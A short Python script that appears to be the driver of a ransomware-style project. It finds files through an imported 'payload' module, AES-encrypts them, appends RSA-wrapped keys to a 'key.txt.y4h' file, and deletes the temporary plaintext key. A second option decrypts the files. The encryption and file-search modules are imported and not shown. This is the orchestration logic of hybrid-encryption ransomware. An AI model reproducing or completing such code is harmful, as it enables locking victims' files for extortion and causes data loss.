from aesd_windows import aes_decrypt
from aes import aes_encrypt
import RSA as Rencrypt
import RSAD as Rdecrypt
import payload as win
import os,sys
driver = int(input("Enter 1 for encryption and 2 for decryption:"))
if(driver == 1):
   onlyfiles = win.find_file("yash")
   count=1
   index = 1
   for file in onlyfiles:
      aes_encrypt(file,2)#change method
      if(count % 3==0 or index == len(onlyfiles)):
          Rencrypt.d_main()
          f = open('res/key.txt.y4h','ab').write(open('res/temp_key.txt','rb').read())
          os.remove('res/temp_key.txt')
          count = 1
      count +=1
      index +=1
elif(driver == 2):
   Rdecrypt.d_main()
   onlyfiles = win.find_file("yash")
   for file in onlyfiles:
       	aes_decrypt(file,2)
   os.remove('res/key.txt')
